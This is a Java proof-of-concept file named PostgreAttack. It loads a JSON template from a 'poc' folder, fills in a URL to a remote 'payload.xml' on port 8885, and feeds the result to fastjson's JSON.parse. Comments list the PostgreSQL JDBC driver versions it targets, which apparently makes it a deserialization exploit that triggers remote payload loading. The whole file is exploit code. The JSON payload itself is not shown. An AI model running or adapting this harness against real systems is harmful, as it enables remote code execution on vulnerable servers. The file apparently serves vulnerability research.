package vul;

import com.alibaba.fastjson.JSON;

import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;

public class PostgreAttack {
    public static void main(String[] args) throws IOException {
        loadXml();
    }

    // 9.4.1208 <= org.postgresql:postgresql < 42.2.25
    // 42.3.0 <= org.postgresql:postgresql < 42.3.2
    public static void loadXml() throws IOException {
        byte[] bytes = Files.readAllBytes(Paths.get("poc/poc68/postgre.json"));
        String json = new String(bytes, StandardCharsets.UTF_8);
        String url = "http://127.0.0.1:8885/payload.xml";
        String format = String.format(json, url);
        JSON.parse(format);
    }
}
